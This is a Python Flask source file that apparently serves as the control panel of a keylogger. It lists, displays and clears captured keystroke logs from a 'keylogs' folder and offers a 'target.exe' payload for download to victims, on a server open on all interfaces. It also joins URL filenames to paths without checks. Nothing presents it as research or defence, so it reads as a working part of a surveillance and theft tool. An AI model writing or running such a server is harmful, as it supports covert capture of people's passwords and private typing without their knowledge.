from flask import Flask, render_template, send_file, request
import os

app = Flask(__name__)

# Define the keylogs directory
KEYLOGS_FOLDER = os.path.join(os.path.dirname(__file__), 'keylogs')

def get_text_files():
    """Retrieves a list of text files from the keylogs directory."""
    if not os.path.exists(KEYLOGS_FOLDER):
        os.makedirs(KEYLOGS_FOLDER)  # Create the directory if it doesn't exist

    # Create a mapping of full file name to display name (without .txt)
    text_files = os.listdir(KEYLOGS_FOLDER)
    return [{"full_name": f, "display_name": f[:-13]} for f in text_files if f.endswith(".txt")]

@app.route("/")
def index():
    text_files = get_text_files()
    return render_template("index.html", text_files=text_files)

@app.route("/show_file/<filename>")
def show_file(filename):
    filepath = os.path.join(KEYLOGS_FOLDER, filename)
    if not os.path.isfile(filepath):
        return f"File '{filename}' not found."
    try:
        with open(filepath, "r") as f:
            file_content = f.read()
    except FileNotFoundError:
        return f"Error accessing file '{filename}'"
    return file_content

@app.route("/clear_content/<filename>", methods=["POST"])
def clear_content(filename):
    filepath = os.path.join(KEYLOGS_FOLDER, filename)
    if not os.path.isfile(filepath):
        return f"File '{filename}' not found.", 404

    try:
        with open(filepath, "w") as f:  # Open in write mode to clear content
            f.write("")  # Write an empty string to clear the file
        return "", 204
    except PermissionError:
        return "Error deleting file: Insufficient permissions.", 403
    except OSError as e:
        return f"Error clearing file: {e}", 500

@app.route("/download_target")
def download_target_file():
    # Corrected path based on the directory structure
    file_path = os.path.join(os.path.dirname(__file__), '..', 'dist', 'target.exe')
    if not os.path.exists(file_path):
        return "Error: target.exe file not found.", 404
    return send_file(file_path, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=3500)
